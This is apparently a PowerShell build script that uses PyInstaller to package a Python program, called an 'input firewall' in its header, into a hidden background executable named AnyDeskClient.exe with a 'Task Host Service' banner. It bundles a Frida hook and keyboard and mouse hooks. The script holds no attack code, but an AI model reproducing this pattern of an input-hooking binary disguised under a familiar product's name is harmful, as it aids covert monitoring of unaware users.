# ============================================================================
# Blackhole Input Firewall - Build Script (PowerShell)
# Builds the service into a standalone executable using PyInstaller
# ============================================================================

param(
    [switch]$Dev
)

Write-Host ""
Write-Host "========================================"
Write-Host "  Task Host Service - Build"
Write-Host "========================================"
Write-Host ""

# ============================================================================
# Step 1: Virtual Environment Setup
# ============================================================================

$venvPath = "venv"
$venvPython = "$venvPath\Scripts\python.exe"
$venvPip = "$venvPath\Scripts\pip.exe"

# Create virtual environment if it doesn't exist
if (-not (Test-Path $venvPath)) {
    Write-Host "Creating virtual environment..." -ForegroundColor Cyan
    python -m venv $venvPath
    if ($LASTEXITCODE -ne 0) {
        Write-Host "ERROR: Failed to create virtual environment" -ForegroundColor Red
        Write-Host "Make sure Python is installed and accessible"
        Write-Host ""
        Read-Host "Press Enter to exit"
        exit 1
    }
    Write-Host "  ✓ Virtual environment created" -ForegroundColor Green
} else {
    Write-Host "Virtual environment found" -ForegroundColor Green
}

Write-Host ""

# ============================================================================
# Step 2: Install/Update Requirements
# ============================================================================

Write-Host "Installing requirements..." -ForegroundColor Cyan
Write-Host ""

# Upgrade pip first
Write-Host "Upgrading pip:" -ForegroundColor Yellow
& $venvPip install --upgrade pip
if ($LASTEXITCODE -ne 0) {
    Write-Host ""
    Write-Host "ERROR: Failed to upgrade pip" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host ""
Write-Host "Installing packages from requirements.txt:" -ForegroundColor Yellow
& $venvPip install -r requirements.txt
if ($LASTEXITCODE -ne 0) {
    Write-Host ""
    Write-Host "ERROR: Failed to install requirements" -ForegroundColor Red
    Write-Host "Check requirements.txt for issues"
    Write-Host ""
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host ""
Write-Host "Verifying PyInstaller..." -ForegroundColor Cyan
& $venvPython -c "import PyInstaller" 2>$null
if ($LASTEXITCODE -ne 0) {
    Write-Host "ERROR: PyInstaller not found in virtual environment" -ForegroundColor Red
    Write-Host "Add 'pyinstaller' to requirements.txt"
    Write-Host ""
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host "  ✓ All requirements installed" -ForegroundColor Green
Write-Host ""

# ============================================================================
# Step 3: Clean Previous Builds
# ============================================================================

Write-Host "Cleaning previous builds..." -ForegroundColor Cyan
if (Test-Path "dist") { Remove-Item -Recurse -Force "dist" }
if (Test-Path "build") { Remove-Item -Recurse -Force "build" }
if (Test-Path "AnyDeskClient.spec") { Remove-Item -Force "AnyDeskClient.spec" }
Write-Host "  ✓ Build directories cleaned" -ForegroundColor Green
Write-Host ""

# ============================================================================
# Step 4: Build Executable with PyInstaller
# ============================================================================

# Build based on mode
if ($Dev) {
    Write-Host "Building in DEV mode (with console window)..." -ForegroundColor Cyan
    Write-Host ""
    
    & $venvPython -m PyInstaller --onefile `
        --console `
        --name AnyDeskClient `
        --icon windowprogram.ico `
        --add-data "utils/frida_hook.js;utils" `
        --hidden-import=pynput.keyboard._win32 `
        --hidden-import=pynput.mouse._win32 `
        main.py
    
    if ($LASTEXITCODE -ne 0) {
        Write-Host ""
        Write-Host "ERROR: Build failed!" -ForegroundColor Red
        Read-Host "Press Enter to exit"
        exit 1
    }
    
    # Create .dev_mode marker in dist folder
    Write-Host ""
    Write-Host "Creating .dev_mode marker..." -ForegroundColor Cyan
    New-Item -ItemType File -Path "dist\.dev_mode" -Force | Out-Null
    Write-Host "  ✓ Created: dist\.dev_mode" -ForegroundColor Green
    
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "  ✓ Build Complete (DEV MODE)" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "Output:      dist\AnyDeskClient.exe"
    Write-Host "Dev Marker:  dist\.dev_mode"
    Write-Host "Console:     VISIBLE (for debugging)"
    Write-Host "Venv:        Using venv\Scripts\python.exe"
    Write-Host ""
    Write-Host "To install: .\install.ps1 -Dev"
    Write-Host ""
    
} else {
    Write-Host "Building in PRODUCTION mode (headless, no console)..." -ForegroundColor Cyan
    Write-Host ""
    
    & $venvPython -m PyInstaller --onefile `
        --noconsole `
        --name AnyDeskClient `
        --icon windowprogram.ico `
        --add-data "utils/frida_hook.js;utils" `
        --hidden-import=pynput.keyboard._win32 `
        --hidden-import=pynput.mouse._win32 `
        main.py
    
    if ($LASTEXITCODE -ne 0) {
        Write-Host ""
        Write-Host "ERROR: Build failed!" -ForegroundColor Red
        Read-Host "Press Enter to exit"
        exit 1
    }
    
    # Remove .dev_mode marker if it exists from previous dev build
    if (Test-Path "dist\.dev_mode") {
        Remove-Item "dist\.dev_mode" -Force
        Write-Host ""
        Write-Host "Removed old .dev_mode marker from dist folder"
    }
    
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "  ✓ Build Complete (PRODUCTION MODE)" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "Output:  dist\AnyDeskClient.exe"
    Write-Host "Console: HIDDEN (silent background service)"
    Write-Host "Venv:    Using venv\Scripts\python.exe"
    Write-Host ""
    Write-Host "To install: .\install.ps1"
    Write-Host ""
}

Read-Host "Press Enter to exit"

